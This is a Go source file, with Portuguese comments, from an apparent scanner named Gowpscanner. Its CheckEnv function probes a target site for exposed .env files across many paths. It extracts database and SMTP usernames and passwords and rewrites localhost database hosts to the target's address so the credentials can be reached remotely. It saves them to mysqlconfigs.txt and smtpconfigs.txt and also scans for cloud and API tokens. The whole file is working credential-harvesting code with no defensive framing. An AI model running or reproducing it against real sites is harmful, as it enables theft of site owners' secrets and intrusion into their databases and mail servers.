// internal\scanner\env.go
package scanner

import (
	"fmt"
	"strings"

	"Gowpscanner/internal/utils"
	"Gowpscanner/internal/wpdetect"
)

// envList (carregadas em init ou por outro método)
var envList []string

// CheckEnv verifica se o domínio possui um arquivo .env válido em diferentes caminhos
// e salva a URL do .env válido no arquivo env-production.txt.
func CheckEnv(baseURL string) {
	var contador int = 0

	// Itera sobre cada caminho e faz a verificação
	for _, p := range envList {
		contador++
		//caso o contador seja multiplo de 100, exibe mensagem
		if contador%100 == 0 {
			utils.Info("Verificando Env %s -  %d/%d", baseURL, contador, len(envList))
		}

		envURL := fmt.Sprintf("%s%s", baseURL, p)

		// Tenta obter o conteúdo usando GetBody (que já retorna erro se o status não for 200)
		content, err := utils.GetBody(envURL)
		if err != nil {
			// Se ocorrer algum erro, não há .env acessível nesse caminho
			continue
		}

		// Converte para minúsculas para facilitar as comparações
		lowerContent := strings.ToLower(content)

		// Verifica se o conteúdo não contém HTML (indicativo de uma resposta inválida)
		if strings.Contains(lowerContent, "<html") || strings.Contains(lowerContent, "<!doctype html") {
			// Se encontrar HTML, ignora esse caminho
			continue
		}

		wpdetect.CheckFirebaseIO(content)
		wpdetect.CheckDigitalOceanToken(content)
		wpdetect.CheckAllTokens(content, envURL)

		// Verifica se o conteúdo contém algumas chaves típicas de um arquivo .env
		if strings.Contains(lowerContent, "app_name=") ||
			strings.Contains(lowerContent, "app_key=") ||
			strings.Contains(lowerContent, "api=") ||
			strings.Contains(lowerContent, "password=") ||
			strings.Contains(lowerContent, "senha=") ||
			strings.Contains(lowerContent, "key=") ||
			strings.Contains(lowerContent, "app_secret=") ||
			strings.Contains(lowerContent, "smtp=") ||
			strings.Contains(lowerContent, "mail_host=") ||
			strings.Contains(lowerContent, "mail_user=") ||
			strings.Contains(lowerContent, "mail_username=") ||
			strings.Contains(lowerContent, "smtp_host=") ||
			strings.Contains(lowerContent, "smtp_user=") ||
			strings.Contains(lowerContent, "smtp_username=") ||
			strings.Contains(lowerContent, "db_name=") ||
			strings.Contains(lowerContent, "db_user=") ||
			strings.Contains(lowerContent, "db_pass=") ||
			strings.Contains(lowerContent, "db_host=") {
			// Se passou nos testes, considera-se um .env válido
			utils.LogSave(envURL, "env-production.txt")
			utils.Warning("Arquivo .env válido encontrado em %s", envURL)
			utils.BeepAlert()

			envValues := extractENVValues(content)

			if len(envValues) > 0 {
				// Se quiser tratar especificamente a lógica de DB_HOST, por exemplo:
				if dbhost, ok := envValues["DB_HOST"]; ok {
					//verifica se tem null ou vazio
					if dbhost == "null" || dbhost == "" {
						utils.Info("DB_HOST é nulo ou vazio, dados não serão salvos em mysqlconfigs.txt")
					} else {
						//extrai somente o host do site
						tmphostarr := strings.Split(envURL, "/")
						tmphost := tmphostarr[2]
						//troca localhost pelo tmphost
						dbhost = strings.Replace(dbhost, "localhost", tmphost, -1)
						//troca 127.0.0.1 pelo tmphost
						dbhost = strings.Replace(dbhost, "127.0.0.1", tmphost, -1)
						envValues["DB_HOST"] = dbhost

						//vertifica se tem null ou vazio
						if envValues["DB_USERNAME"] == "null" ||
							envValues["DB_PASSWORD"] == "null" ||
							envValues["DB_DATABASE"] == "null" ||
							envValues["DB_USER"] == "null" ||
							envValues["DB_PASS"] == "null" {
							utils.Info("DB_USERNAME, DB_PASSWORD, DB_DATABASE, DB_USER ou DB_PASS é nulo ou vazio, dados não serão salvos em mysqlconfigs.txt")
						} else {
							var envOutput string = fmt.Sprintf("URL: %s HOST:%s USERNAME:%s%s PASSWORD:%s%s DATABASE:%s", envURL, envValues["DB_HOST"], envValues["DB_USERNAME"], envValues["DB_USER"], envValues["DB_PASSWORD"], envValues["DB_PASS"], envValues["DB_DATABASE"])

							// Salva a saída no arquivo mysqlconfigs.txt
							utils.LogSave(envOutput, "mysqlconfigs.txt")
							utils.Warning(envOutput)
							utils.BeepAlert()
						}

					}
				}

				// SMTP_HOST, por exemplo:
				if smtphost, ok := envValues["MAIL_HOST"]; ok {
					// Caso você queira ignorar hosts locais:
					if smtphost == "localhost" || smtphost == "127.0.0.1" || smtphost == "localhost:3306" || smtphost == "" {
						utils.Info("SMTP_HOST é %s, dados não serão salvos em smtpconfigs.txt", smtphost)
					} else {
						//vertifica se tem null ou vazio
						if envValues["MAIL_USERNAME"] == "null" || envValues["MAIL_PASSWORD"] == "null" || envValues["MAIL_USER"] == "null" {
							utils.Info("MAIL_USERNAME, MAIL_PASSWORD ou MAIL_USER é nulo ou vazio, dados não serão salvos em smtpconfigs.txt")
						} else {
							var envOutput string = fmt.Sprintf("URL: %s MAIL_HOST:%s MAIL_USERNAME:%s%s MAIL_PASSWORD:%s%s", envURL, envValues["MAIL_HOST"], envValues["MAIL_USERNAME"], envValues["MAIL_USER"], envValues["MAIL_PASS"], envValues["MAIL_PASSWORD"])
							// Salva a saída no arquivo smtpconfigs.txt
							utils.LogSave(envOutput, "smtpconfigs.txt")
							utils.Warning(envOutput)
							utils.BeepAlert()
						}
					}
				}
			}
		}
	}
}

// extractENVValues extrai as variáveis do tipo CHAVE=VALOR de um conteúdo .env
func extractENVValues(content string) map[string]string {
	envMap := make(map[string]string)

	// Divide o conteúdo em linhas
	lines := strings.Split(content, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)

		// Ignora linhas vazias ou que começam com comentário (#)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Divide em no máximo 2 partes (CHAVE=VALOR)
		parts := strings.SplitN(line, "=", 2)
		if len(parts) == 2 {
			chave := strings.TrimSpace(parts[0])
			valor := strings.TrimSpace(parts[1])
			//retira aspas do valor
			valor = strings.Trim(valor, "\"")
			//retira aspas simples do valor
			valor = strings.Trim(valor, "'")
			// Armazena no map
			envMap[chave] = valor
		}
	}

	return envMap
}
